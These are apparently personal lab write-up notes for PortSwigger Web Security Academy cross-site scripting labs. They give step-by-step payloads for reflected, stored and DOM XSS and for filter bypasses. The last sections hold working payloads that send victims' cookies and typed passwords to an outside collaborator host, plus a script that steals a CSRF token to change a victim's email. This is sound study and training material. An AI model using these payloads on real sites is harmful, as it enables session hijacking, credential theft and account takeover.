# Navigation
- [Reflected XSS into HTML context with nothing encoded](#reflected-xss-into-html-context-with-nothing-encoded)
- [Stored XSS into HTML context with nothing encoded](#stored-xss-into-html-context-with-nothing-encoded)
- [DOM XSS in `document.write` using `location.search`](#dom-xss-in-documentwrite-sink-using-source-locationsearch)
- [DOM XSS in `innerHTML` using `location.search`](#dom-xss-in-innerhtml-sink-using-source-locationsearch)
- [DOM XSS in jQuery `href` using `location.search`](#dom-xss-in-jquery-anchor-href-attribute-sink-using-locationsearch-source)
- [DOM XSS in jQuery selector via hashchange](#dom-xss-in-jquery-selector-sink-using-a-hashchange-event)
- [Reflected XSS into attribute with angle brackets encoded](#reflected-xss-into-attribute-with-angle-brackets-html-encoded)
- [Stored XSS into `href` attribute with quotes encoded](#stored-xss-into-anchor-href-attribute-with-double-quotes-html-encoded)
- [Reflected XSS in JavaScript string with angle brackets encoded](#reflected-xss-into-a-javascript-string-with-angle-brackets-html-encoded)
- [DOM XSS in `document.write` inside `<select>` element](#dom-xss-in-documentwrite-sink-using-source-locationsearch-inside-a-select-element)
- [DOM XSS in AngularJS expression](#dom-xss-in-angularjs-expression-with-angle-brackets-and-double-quotes-html-encoded)
- [Reflected DOM XSS with `eval`](#reflected-dom-xss)
- [Stored DOM XSS due to bad `replace`](#stored-dom-xss)
- [Reflected XSS with most tags blocked](#reflected-xss-into-html-context-with-most-tags-and-attributes-blocked)
- [Reflected XSS with all tags blocked except custom ones](#reflected-xss-into-html-context-with-all-tags-blocked-except-custom-ones)
- [Reflected XSS with SVG markup allowed](#reflected-xss-with-some-svg-markup-allowed)
- [Reflected XSS in canonical link tag](#reflected-xss-in-canonical-link-tag)
- [Reflected XSS in JS string with quotes/backslashes escaped](#reflected-xss-into-a-javascript-string-with-single-quote-and-backslash-escaped)
- [Reflected XSS with all common characters encoded/escaped](#reflected-xss-into-a-javascript-string-with-angle-brackets-and-double-quotes-html-encoded-and-single-quotes-escaped)
- [Stored XSS in `onclick` with quotes/backslashes escaped](#stored-xss-into-onclick-event-with-angle-brackets-and-double-quotes-html-encoded-and-single-quotes-and-backslash-escaped)
- [Reflected XSS in template literal](#reflected-xss-into-a-template-literal-with-angle-brackets-single-double-quotes-backslash-and-backticks-unicode-escaped)
- [XSS to steal cookies](#exploiting-cross-site-scripting-to-steal-cookies)
- [XSS to capture passwords](#exploiting-cross-site-scripting-to-capture-passwords)
- [XSS to bypass CSRF](#exploiting-xss-to-bypass-csrf-defenses)
# Reflected XSS into HTML context with nothing encoded
1. Put payload into search bar
```
<img src=x onerror=alert(document.domain)>
```
# Stored XSS into HTML context with nothing encoded
1. View a post
2. Submit a comment with bold tags `<b>comment</b>`
	1. View post again and see that the comment is in bold
3. Submit a comment with to trigger an alert
```
<img src=x onerror=alert(document.domain)>
```
# DOM XSS in `document.write` sink using source `location.search`
1. Launch burp browser and enable DOM Invader extension
2. Copy the canary into the search bar and submit request
3. DOM Invader gives us the following value in the Sink
```
<img src="/resources/images/tracker.gif?searchTerms=yldsyqn9">
```
4. Craft a payload to break out of the HTML tag and start a new scriptable context
```
"><img src=x onerror=alert(document.domain)>
```
- `">` closes of the tag our input was inserted into before
# DOM XSS in `innerHTML` sink using source `location.search`
1. Open DOM Invader > Copy Canary > Post into search bar
2. Our input is being fed into the sink `element.innerHTML`
```
<span id="searchMessage"></span>
```
3. Craft payload to break out of the HTML tag
```
"><img src=x onerror=alert(document.domain)>
```
# DOM XSS in jQuery anchor `href` attribute sink using `location.search` source
1. Open DOM Invader > Copy Canary > navigate to Submit Feedback feature in app
2. In the URL, there is a `returnPath` parameter > Submit canary token and see DOM Invader identifies this
	1. Follow the stack trace and see that the page uses the `attr()` function which can change the DOM
	2. Inspect the `<Back` button in the HTML and see our input is returned in the HTML and inside a `href` attribute
3. Submit a malicious payload inside the `href` attribute
```
https://<SNIP>.web-security-academy.net/feedback?returnPath=javascript:alert(document.domain)
```
# DOM XSS in jQuery selector sink using a hashchange event
- Deliver exploit to victim
1. Open web root
2. Identify script in HTML source
```html
<script>
$(window).on('hashchange', function(){
	var post = $('section.blog-list h2:contains(' + decodeURIComponent(window.location.hash.slice(1)) + ')');
	if (post) post.get(0).scrollIntoView();
});
</script>
```
- We can trigger a hash-change event by providing a h2 heading value
3. Inspect the HTML source for a `<h2>` heading value e.g. `No Silly Names, Please`
4. Scroll to the top of the document and construct the following malicious URL
```
https://<SNIP>.web-security-academy.net/#No Silly Names, Please onload=this.src ='<img src=x onerror=alert(document.domain)>'">
```
5. Use the URL in your own browser and confirm the payload triggers alert function
6. Exploit server
7. Construct the following payload
```html
<iframe src="https://0aff00970402ea8d80f2032c004c0072.web-security-academy.net/#Scams" onload="this.src+='<img src=x onerror=print(document.domain)>'">
```
- Scams was a shorter `<h2>` heading that I used
- Deliver exploit to victim
# Reflected XSS into attribute with angle brackets HTML-encoded
1. Search bar
2. Submit candidate payload and see that angle brackets are encoded
3. Input is included inside an `<input` tag
4. Close the attribute and introduce a new attribute that can create a scriptable context
```
GET /?search=XSSTESTING" autofocus onfocus="alert(document.domain)
```
# Stored XSS into anchor `href` attribute with double quotes HTML-encoded
1. View post
2. Submit a comment and send to repeater
3. No XSS vectors in the comment, name, email parameter
4. Website submitted data goes into a `href` attribute
5. Construct a malicious URL
```
javascript:alert(document.domain)
```
# Reflected XSS into a JavaScript string with angle brackets HTML encoded
1. Search bar
2. Submit user input and see that our input is fed into a `<script>` tag
3. Angle brackets are HTML encoded
4. Break out of the current JavaScript string and call `alert()`
```
GET /?search=XSSTESTING';alert(document.domain)//
```
- Alternative payload: `'-alert(document.domain)-'`
# DOM XSS in `document.write` sink using source `location.search` inside a select element
1. View product details
2. Identify `<script>` in the HTTP response
```html
<script>
var stores = ["London","Paris","Milan"];
var store = (new URLSearchParams(window.location.search)).get('storeId');
document.write('<select name="storeId">');
if(store) {
document.write('<option selected>'+store+'</option>');
}
for(var i=0;i<stores.length;i++) {
	if(stores[i] === store) {
		continue;
	}
	document.write('<option>'+stores[i]+'</option>');
}
document.write('</select>');
</script>
```
- This takes a `storeId` parameter from the URL and passes it to `document.write` where the options are for the stores
3. Construct a search and see where it is returned in the HTML
```
GET /product?productId=3&storeId=XSSTESTING
```
4. In the browser, our `XSSTESTING` appears in the DOM
```html
<select name="storeId">
<option selected>xsstesting</option>slot
...<SNIP>...
```
- We can see our request is inside a `<select` element
- **Note:** This is not readable from Burp. We have to use the browser itself to see the manipulated DOM elements
5. Construct a payload to break out of the `<select>` element and execute a payload
```
https://<SNIP>.web-security-academy.net/product?productId=1&storeId=xsstesting</select><img src=x onerror=alert(document.domain)>
```
# DOM XSS in AngularJS expression with angle brackets and double quotes HTML-encoded
1. Web root
2. Inspect HTML and see document body has `ng-app` attribute
3. Search bar
4. Probe payload `{{7*7}}`
5. Response returns `0 search results for '49'`
6. Submit alert payload
```
{{constructor.constructor('alert(document.domain)')()}}
```
# Reflected DOM XSS
1. Web root
2. DOM Invader > Copy Canary > Search for Canary
3. We see our canary is passed to the `eval()` sink and it is assigned to a variable `searchResultsObj` inside some JavaScript
4. Follow the stack trace and we see it passed into the following JavaScript
```javascript
function search(path) {
    var xhr = new XMLHttpRequest();
    xhr.onreadystatechange = function() {
        if (this.readyState == 4 && this.status == 200) {
            eval('var searchResultsObj = ' + this.responseText);
            displaySearchResults(searchResultsObj);
        }
    };
    xhr.open("GET", path + window.location.search);
    xhr.send();
```
- We can see that it is using the URL to construct the `searchResultsObj`
5. In Burp we see our first search request returning the HTML document then a subsequent request to the server which is reflecting our input
```
GET /?search=XSSTESTING                   // request 1
GET /search-results?search=XSSTESTING     // request 2
```
- Response from request 2
```js
{"results":[],"searchTerm":"XSSTESTING"}
```
6. Our `searchTerm` is being passed into the eval sink above
7. After some mucking around we get a successful payload
```http
GET /search-results?search=XSSTESTING\"};alert(document.domain);//
```
- We have to include the backslash because our double quote was getting escaped
- This works because `eval()` interprets the argument passed as JavaScript code, not just a JSON object or data
- `eval()` effectively interpreted our payload as
```js
{"results":[],"searchTerm":"XSSTESTING\\"};alert(document.domain);//"}
```
# Stored DOM XSS
1. View Post
2. View JavaScript sources and read `loadCommentsWithVulnerableEscape.js`
```javascript
    function escapeHTML(html) {
        return html.replace('<', '&lt;').replace('>', '&gt;');
    }
```
- This `html.replace` function is vulnerable because `replace()` will only perform the operation once; From MDN Docs - "A string pattern will only be replaced once. To perform a global search and replace, use a regular expression with the `g` flag, or use [`replaceAll()`](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/String/replaceAll) instead."
3. With this knowledge submit a comment like so
```
<><img src=x onerror=alert(document.domain)>
```
# Reflected XSS into HTML context with most tags and attributes blocked
1. Search function
2. `<script>` tag inserted triggers WAF
3. Go to XSS Cheat Sheet and copy all tags to clipboard
4. Send request to intruder and fuzz with all tags
5. Identify `<body>` is an allowed tag
6. Use same method to fuzz allowed events and notice that some are allowed, namely `onresize`
7. Go to exploit server and create an `iframe` which will resize to trigger the event
```html
<iframe src='https://0a3c00a903b2379f800b030000140038.web-security-academy.net/?search=<body onresize=print(document.domain)></body>'onload=this.style.width='100px'>
```
- If the payload does not fire properly, inspect the HTML and search for `onresize` and see how it is presented in the HTML
# Reflected XSS into HTML context with all tags blocked except custom ones
1. Search function
2. All tags are blocked except custom ones
3. Use the cheat sheet to find an auto firing exploit
4. Exploit server
5. Create malicious payload
```html
<html>
<head></head>
<body>
<script>
document.location = "https://0a93003604989d908068032300aa00fe.web-security-academy.net/?search=<xss onfocus=alert(document.cookie) autofocus tabindex=1>"
</script>
</body>
</html>
```
# Reflected XSS with some SVG markup allowed
1. Search function
2. SVG tags are allowed
3. Read through cheat sheet and see there are multiple SVG markup tags
4. Test each one and get a successful payload with `animatetransform`
```
GET /?search=xsstesting<svg><animatetransform onbegin=alert(1) attributeName=transform>
```
# Reflected XSS in canonical link tag
1. Web root
2. Canonical tag in the HTTP response
```
<link rel="canonical" href='https://0a7b00f203c4cbf398f4c76000df0052.web-security-academy.net/'/>
```
3. Probe XSS characters after a question mark in the URL
```
GET /?'"<>
```
- Response indicates that we can create new attributes because we can inject a single quote and break the `href` tag
```html
<link rel="canonical" href='https://0aa800540325cb1798b2d1cb006f00dd.web-security-academy.net/?'%22%3c%3e'/>
```
4. Use XSS cheatsheet and create a valid payload
```
GET /?'accesskey%3d'X'onclick='alert(document.domain)
```
- If a victim navigates to the URL and presses `<COMMAND> + <SHIFT> + X`, they will trigger the payload
# Reflected XSS into a JavaScript string with single quote and backslash escaped
1. Search function
2. Payload appears inside a script tag and single quotes and backslashes are escaped
3. Submit payload that terminates the existing script tag and introduce your own one
```
GET /?search=xsstesting</script><img+src%3dx+onerror%3dalert(document.domain)>
```
- This works because the browser first performs the HTML parsing, then subsequently performs JS parsing
# Reflected XSS into a JavaScript string with angle brackets and double quotes HTML-encoded and single quotes escaped
1. Search function
2. Payload appears inside a script tag and everything is HTML encoded except for single quotes
3. Submitting first single quote payload reveals that it is escaped
4. Submit our own backslash to escape the backslash meant to escape our payload and successfully breakout of the JavaScript
5. Insert alert payload
```
/?search=xsstesting\';alert(document.domain)//
```
# Stored XSS into `onclick` event with angle brackets and double quotes HTML-encoded and single quotes and backslash escaped
1. View post
2. Submit a comment including a website
3. See that our user input is submitted inside a JavaScript quoted tag attribute
```html
<a id="author" href="https://test.com" onclick="var tracker={track(){}};tracker.track('https://test.com');">
```
4. All attempts to inject single quotes and double quotes are filtered
5. HTML encode the single quote of the payload and insert it into the website parameter
```
website=https%3A%2F%2Fxsstesting1.com%26apos%3b-alert(document.domain)-%26apos%3b
```
- Note: You need to URL encode the `&apos;` as to not break syntax in the POST body
# Reflected XSS into a template literal with angle brackets, single, double quotes, backslash and backticks Unicode-escaped
1. Search function
2. Submitted data is reflected inside a JavaScript template literal (this was identified because our data appears inside backticks)
3. Submit a payload with a `${...}` syntax
```
GET /?search=xsstesting${alert(document.domain)}
```
# Exploiting cross-site scripting to steal cookies
1. View post
2. Submit basic XSS payload in each field and see that "comment" is vulnerable to basic XSS payload
3. Post a comment that will inject a script tag that will send the victim's cookies to our URL
```
comment=<script>var i=new Image; i.src="https://3x16xmbwqvg1d4jy9hdyf01iv910pqdf.oastify.com/?c=" document.cookie;</script>
```
4. Check collaborator
5. Use collected session cookie and replace your own to take over the administrator's session
# Exploiting cross-site scripting to capture passwords
1. View post
2. Basic XSS payload executes in the "comment" field
3. Use the following payload to create a login form which will detect if any data is entered and send it to your collaborator domain
```html
<input name=username id=username> <input type=password name=password onchange="if(this.value.length)fetch('https://BURP-COLLABORATOR-SUBDOMAIN',{ method:'POST', mode: 'no-cors', body:username.value+':'+this.value });">
```
4. Check collaborator for credentials
# Exploiting XSS to bypass CSRF defenses
- Solve the lab by changing the email address of another user
1. We can login and change our email address
2. Viewing a post we can submit comments and confirm that the comment field is vulnerable to stored XSS
3. Submit a comment with the following payload
```html
<script>
window.addEventListener('DOMContentLoaded', function(){
var token = document.getElementsByName('csrf')[0].value;

var data = new FormData();
data.append('csrf', token)
data.append('email', 'pwn@hacked.lol');

fetch('/my-account/change-email', {
	method: 'POST',
	mode: 'no-cors',
	body: data
	});
});
</script>
```
- This will collect the CSRF token then submit a fetch request to change the victim's email address